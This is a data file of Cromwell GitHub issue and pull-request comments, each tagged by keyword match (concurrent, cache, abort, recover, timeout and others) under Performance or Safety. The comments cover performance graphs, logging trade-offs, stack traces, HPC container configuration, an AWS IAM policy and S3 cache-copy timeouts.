cromwell.en,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:4113,concurren,concurrent,4113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['concurren'],['concurrent']
Performance,"what does the Y axis represent? Maximum requests/s? What is the takeaway? . It _looks_ like performance degraded slightly, no? So the question is whether to move ahead despite this? If that is the case I vote yes, let's move ahead.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5150#issuecomment-529975832:92,perform,performance,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5150#issuecomment-529975832,1,['perform'],['performance']
Performance,which reminds me we need to inline the Docker image cache manifest the same way we did the reference file manifest...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6206#issuecomment-793158887:52,cache,cache,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6206#issuecomment-793158887,1,['cache'],['cache']
Performance,"work bytes higher:. <img width=""1338"" alt=""Screen Shot 2019-09-13 at 8 13 00 PM"" src=""https://user-images.githubusercontent.com/1087943/64965213-93d73b80-d86a-11e9-9278-03b6f665c378.png"">. ---. Database page read/writes identical:. <img width=""1334"" alt=""Screen Shot 2019-09-13 at 8 13 39 PM"" src=""https://user-images.githubusercontent.com/1087943/64965215-93d73b80-d86a-11e9-9db5-4416f5e94719.png"">. ---. Database CPU identical:. <img width=""1332"" alt=""Screen Shot 2019-09-13 at 8 13 52 PM"" src=""https://user-images.githubusercontent.com/1087943/64965216-946fd200-d86a-11e9-9735-6d91a8b74a4d.png"">. ---. Database egress bytes modestly higher, consistent with higher inbound on summarizer:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 14 33 PM"" src=""https://user-images.githubusercontent.com/1087943/64965217-946fd200-d86a-11e9-8fb5-c11a49da15e4.png"">. ---. Not too surprising, but SQL query rate also identical:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 15 13 PM"" src=""https://user-images.githubusercontent.com/1087943/64965218-946fd200-d86a-11e9-9db7-3149df61c0e0.png"">. ---. I thought it was interesting that the only variable that showed much change is bytes over the network. Theory:. MySQL pages on disk are buckets of row values. MySQL accesses the disk at the granularity of a page, it can't fetch just a single value. Therefore, fetching some data from a page (MySQL filtering) versus all data from a page (client-side filtering) does not make a difference in the number of pages read. This is supported by the graph. It would also appear that filtering in memory, whether on client or server, does not have much of a CPU cost at all either for Cromwell nor for MySQL, because we do not see MySQL doing any less work nor Cromwell doing any more. I think this is because once a set of rows is already in memory (after reading a page or receiving the rows over the wire) choosing specific ones is trivial. For MySQL, finding and loading the pages into memory is the hard part.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474:2735,load,loading,2735,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474,1,['load'],['loading']
Performance,"writing all of that crap we write to logs is a nontrivial performance impact, but we like logs so we've got to do it. we have a pretty vanilla logging setup, we could be *way* smarter about things in terms of impact to performance. this would help there. . risk of dropping is small and tunable, where as one tunes the risk down so goes the performance gain (and vice versa). one of those things where if you can live with the slight possibility that any particular specific log message never makes it you're AOK.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329791294:58,perform,performance,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329791294,4,"['perform', 'tune']","['performance', 'tunes']"
Performance,"ystem)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Starting.; [WARN] [03/03/2016 23:43:18.664] [test-system-akka.actor.default-dispatcher-4] [akka://test-system/system/IO-TCP/selectors/$a/1] received dead letter from Actor[akka://test-system/user/IO-HTTP/group-0/1#-1001288108]: Write(ByteString(),spray.io.SslTlsSupport$WriteChunkAck$@22a4ed01); ```. There's another 13 second hang shortly thereafter:. ```; [INFO] [03/03/2016 23:43:19.002] [test-system-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpreted as a workflow needing restart, so another concurrent copy is launched. . ```; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Found 1 workflow to restart.; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Restarting workflow ID: 299b2fc4-6a26-462f-96e3-1281f172d197; [INFO] [03/03/2016 23:43:32.152] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] Invoking restartableWorkflow on 299b2fc4; [INFO] [03/03/2016 23:43:32.153] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = Some(299b2fc4-6a26-462f-96e3-1281f172d197), effective id = 299b2fc4-6a26-462f-96e3-1281f172d197; ```. This quickly falls afoul of a uniqueness constraint:. ```; [ERROR] [03/03/2016 23:43:32.236] [ForkJoinPool-3-worker-1] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: Could not persist runtime attributes; java.sql.SQLIntegrityConstraintVi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:2046,concurren,concurrent,2046,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,2,['concurren'],['concurrent']
Performance,"{cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of running containers without *any* privileges at all. @geoffjentry all this discussion is obviously going way beyond this original PR. Once we've settled on our recommendations, how do you think we should share this information with the Cromwell community? Is an example config in the Cromwell repo the best way (like this PR), or would it serve better to have a new page in the Cromwell documentation? I'm",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:1359,cache,cache,1359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,1,['cache'],['cache']
Performance,"~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.clie",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:6088,concurren,concurrent,6088,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,"~{unqced_sample_list} \; ~{withdrawn_sample_list} \; ~{sex_mismatch_sample_list} \; ~{sex_aneuploidy_sample_list} \; ~{low_genotyping_quality_sample_list} \; ~{""--subpop "" + subpop_sample_list}; >>> . runtime {; shortTask: true; dx_timeout: ""5m""; }; }. task load_shared_covars {; input {; String script_dir; File script = ""~{script_dir}/traits/load_shared_covars.py"". File fam_file; File sc_pcs # 22009; File sc_assessment_ages; }. output {; # all in traits/shared_covars/; File shared_covars = ""shared_covars.npy"" ; File covar_names = ""covar_names.txt""; File assessment_ages = ""assessment_ages.npy""; }. command <<<; ~{script} . ~{fam_file} ~{sc_pcs} ~{sc_assessment_ages}; >>>. runtime {; memory: ""10g"". dx_timeout: ""15m""; }; }. task load_continuous_phenotype {; input {; String script_dir; File script = ""~{script_dir}/traits/load_continuous_phenotype_from_main_dataset.py"". File sc; File qced_sample_list # from qced_sample_list. File assessment_ages_npy # from load shared covars; Array[String] categorical_covariate_names; Array[File] categorical_covariate_scs; }. output {; File data = ""pheno.npy""; File covar_names = ""pheno_covar_names.txt""; File README = ""pheno_README.txt""; }. command <<<; ~{script} \; ~{sc} \; '.' \; ~{qced_sample_list} \; ~{assessment_ages_npy} \; --categorical-covariate-names ~{sep="" "" categorical_covariate_names} \; --categorical-covariate-files ~{sep="" "" categorical_covariate_scs}; >>>. runtime {; shortTask: true; dx_timeout: ""5m""; }; }. task load_binary_phenotype {; input {; String script_dir; File script = ""~{script_dir}/traits/load_binary_phenotype_from_main_dataset.py"". File sc; File qced_sample_list # from qced_sample_list. File sc_year_of_birth # 34; File sc_month_of_birth # 52; File sc_date_of_death # 40000; String date_of_most_recent_first_occurrence_update; Boolean is_zero_one_neg_nan = false; }. output {; File data = ""pheno.npy""; File covar_names = ""pheno_covar_names.txt""; File README = ""pheno_README.txt""; }. command <<<; ~{script} \; ~{sc} \; '",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269:11937,load,load,11937,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269,1,['load'],['load']
Performance,"~~@ruchim writing a cache result (its hashes and its results) should be functionally atomic (i.e. either you get a cache hit, or you don't, and if you do, then you can copy all the results immediately).; If that's not part of this PR then it should 100% be part of Cromwell 27 (IMO)~~. Oops, I misread. You're talking about cache hit vs cache miss in the metadata if copying results fails? If the metadata is overwriting itself then ""current state of play"" is probably ok?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2243#issuecomment-300173806:20,cache,cache,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2243#issuecomment-300173806,4,['cache'],['cache']
Performance,"~~The CGA ""CPU WDL"" validates pretty quickly. With 10,000 requests at a concurrency of 20, the 99% latency is just 249 ms~~. This was actually not doing exactly what I expected: it was failing to parse. At least we know parsing attempts are fast!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458340134:72,concurren,concurrency,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458340134,2,"['concurren', 'latency']","['concurrency', 'latency']"
Performance,"👍 . Massive ToL (as in, this just reminded me of something I saw the other day). The akka docs somewhere make the point that for performance reasons one wants to completely handle an exception as close to the call site as possible and then transform into some other object which won't ever do stack unwinding and such. We often do the opposite, passing exceptions all the way back out and then handling them there. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/2091/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2091#issuecomment-289031598:129,perform,performance,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2091#issuecomment-289031598,1,['perform'],['performance']
Performance,"👍 ; Just totally ToL for more optimization later, maybe if instead of having like now a `Map[JobKey, Status]`,; what we really want is more something like a `Map[Status, List[JobKey]]` ?. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1977/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1977#issuecomment-279144686:30,optimiz,optimization,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1977#issuecomment-279144686,1,['optimiz'],['optimization']
Safety," *** FAILED *** (3 minutes, 18 seconds); - should fail during execution relative_output_paths_colliding *** FAILED *** (3 minutes, 27 seconds); - should successfully run curl *** FAILED *** (8 minutes, 38 seconds); - should successfully run cwl_cache_within_workflow *** FAILED *** (2 minutes, 49 seconds); - should successfully run cwl_import_type_packed *** FAILED *** (3 minutes, 43 seconds); - should successfully run cwl_interpolated_strings *** FAILED *** (2 minutes, 49 seconds); - should successfully run cwl_relative_imports_url *** FAILED *** (3 minutes, 37 seconds); - should successfully run cwl_relative_imports_zip *** FAILED *** (2 minutes, 52 seconds); - should successfully run docker_hash_dockerhub *** FAILED *** (5 minutes, 18 seconds); - should successfully run docker_hash_gcr *** FAILED *** (5 minutes, 31 seconds); - should successfully run docker_hash_quay *** FAILED *** (4 minutes, 31 seconds); - should successfully run hello *** FAILED *** (2 minutes, 54 seconds); - should successfully run hello_yaml *** FAILED *** (2 minutes, 47 seconds); - should successfully run inline_file *** FAILED *** (3 minutes, 4 seconds); - should successfully run inline_file_custom_entryname *** FAILED *** (3 minutes, 9 seconds); - should successfully run iwdr_input_string *** FAILED *** (3 minutes, 10 seconds); - should successfully run iwdr_input_string_function *** FAILED *** (2 minutes, 59 seconds); - should successfully run non_root_default_user *** FAILED *** (3 minutes, 20 seconds); - should successfully run relative_output_paths *** FAILED *** (2 minutes, 42 seconds); - should successfully run space *** FAILED *** (4 minutes, 18 seconds); - should successfully run standard_output_paths_colliding_prevented *** FAILED *** (3 minutes, 1 second); - should successfully run three_step_cwl *** FAILED *** (5 minutes, 29 seconds); - should NOT call cache the second run of readFromCacheFalse (3 minutes, 21 seconds); - should abort a workflow immediately after submission abort.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:2525,abort,abort,2525,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['abort'],['abort']
Safety," definitely have read / write access from my EC2 instance. I also can't see any Cromwell-execution folders in the bucket, but I do see the cromwell-workflow-logs on my EC2 instance. I created the AMI with the cromwell type, and I've checked that my IAM profile has access to the execution and storage bucket, and confirmed this in the CLI. . ```; Caused by: java.io.IOException: Could not read from s3://<bucket-name>/cromwell-execution/gatkRecalNormal/df58d76a-c3fe-4fb7-94c6-f4bd9ad1d5de/call-gatkBaseRecalibrator/gatkBaseRecalibrator-rc.txt: s3://s3.amazonaws.com/<bucket-name>/cromwell-execution/gatkRecalNormal/df58d76a-c3fe-4fb7-94c6-f4bd9ad1d5de/call-gatkBaseRecalibrator/gatkBaseRecalibrator-rc.txt; 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:146); 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:145); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at scala.util.Failure.recoverWith(Try.scala:232); 	at cromwell.engine.io.nio.NioFlow.withReader(NioFlow.scala:145); 	at cromwell.engine.io.nio.NioFlow.limitFileContent(NioFlow.scala:154); 	at cromwell.engine.io.nio.NioFlow.$anonfun$readAsString$1(NioFlow.scala:98); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:336); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:357); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:303); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437251651:1310,recover,recoverWith,1310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437251651,1,['recover'],['recoverWith']
Safety," environment and was able to copy files into the cromwell executions bucket. Though something weird seems to be going on with the authentication because the instance appears to have write permissions for all the s3 buckets in the region, which appears to be due to the AmazonEC2RoleforSSM policy attached to the instance IAM:. ```; {; ""Version"": ""2012-10-17"",; ""Statement"": [; {; ""Effect"": ""Allow"",; ""Action"": [; ""ssm:DescribeAssociation"",; ""ssm:GetDeployablePatchSnapshotForInstance"",; ""ssm:GetDocument"",; ""ssm:GetManifest"",; ""ssm:GetParameters"",; ""ssm:ListAssociations"",; ""ssm:ListInstanceAssociations"",; ""ssm:PutInventory"",; ""ssm:PutComplianceItems"",; ""ssm:PutConfigurePackageResult"",; ""ssm:UpdateAssociationStatus"",; ""ssm:UpdateInstanceAssociationStatus"",; ""ssm:UpdateInstanceInformation""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ssmmessages:CreateControlChannel"",; ""ssmmessages:CreateDataChannel"",; ""ssmmessages:OpenControlChannel"",; ""ssmmessages:OpenDataChannel""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ec2messages:AcknowledgeMessage"",; ""ec2messages:DeleteMessage"",; ""ec2messages:FailMessage"",; ""ec2messages:GetEndpoint"",; ""ec2messages:GetMessages"",; ""ec2messages:SendReply""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""cloudwatch:PutMetricData""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ec2:DescribeInstanceStatus""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ds:CreateComputer"",; ""ds:DescribeDirectories""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""logs:CreateLogGroup"",; ""logs:CreateLogStream"",; ""logs:DescribeLogGroups"",; ""logs:DescribeLogStreams"",; ""logs:PutLogEvents""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""s3:GetBucketLocation"",; ""s3:PutObject"",; ""s3:GetObject"",; ""s3:GetEncryptionConfiguration"",; ""s3:AbortMultipartUpload"",; ""s3:ListMultipartUploadParts"",; ""s3:ListBucket"",; ""s3:ListBucketMultipartUploads""; ],; ""Resource"": ""*""; }; ]; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435109292:1896,Abort,AbortMultipartUpload,1896,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435109292,1,['Abort'],['AbortMultipartUpload']
Safety," improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ; > .; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491>,; > or unsubscribe; > <https://github.com/notifica",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:2080,Timeout,TimeoutException,2080,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['Timeout'],['TimeoutException']
Safety," line 895, in workflow; [2018-11-04T19:02:19.373930Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] graphTasks = runLocusGraph(self,dependencies=graphTaskDependencies); [2018-11-04T19:02:19.373954Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] File ""/usr/local/share/bcbio-nextgen/anaconda/share/manta-1.4.0-1/lib/python/mantaWorkflow.py"", line 296, in runLocusGraph; [2018-11-04T19:02:19.373978Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] mergeTask = self.addTask(preJoin(taskPrefix,""mergeLocusGraph""),mergeCmd,dependencies=tmpGraphFileListTask,memMb=self.params.mergeMemMb); [2018-11-04T19:02:19.374002Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] File ""/usr/local/share/bcbio-nextgen/anaconda/share/manta-1.4.0-1/lib/python/pyflow/pyflow.py"", line 3689, in addTask; [2018-11-04T19:02:19.374023Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] raise Exception(""Task memory requirement exceeds full available resources""); [2018-11-04T19:02:19.374046Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] Exception: Task memory requirement exceeds full available resources; ```. The cwl [requests 4GB](https://github.com/bcbio/test_bcbio_cwl/blob/48ca2661644e01e2d4b7f8ad8f2588a31cf87537/gcp/somatic-workflow/steps/detect_sv.cwl#L25) of memory for this task, which I verified Cromwell did request from PAPI as well:; <pre>; resources:; projectId: broad-dsde-cromwell-perf; regions: []; virtualMachine:; accelerators: []; bootDiskSizeGb: 21; bootImage: projects/cos-cloud/global/images/family/cos-stable; cpuPlatform: ''; disks:; - name: local-disk; sizeGb: 10; sourceImage: ''; type: pd-ssd; labels:; cromwell-sub-workflow-name: wf-svcall-cwl; cromwell-workflow-id: cromwell-0344f62e-809d-48d4-8e9a-ede11fe5dd5c; wdl-call-alias: detect-sv; wdl-task-name: detect-sv-cwl; <b>machineType: custom-2-4096</b>; </pre>. @chapmanb I was curious if you've seen this before ? I'm modifying the CWL to ask for a bit more memory but I'm wondering if there's something else that Cromwell is not doing right",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-435937856:3070,detect,detect-sv,3070,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-435937856,2,['detect'],"['detect-sv', 'detect-sv-cwl']"
Safety," on device\n""); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:79); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:585); 	at ; cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:592); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1099); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1095); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495:2664,recover,recoverWith,2664,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495,1,['recover'],['recoverWith']
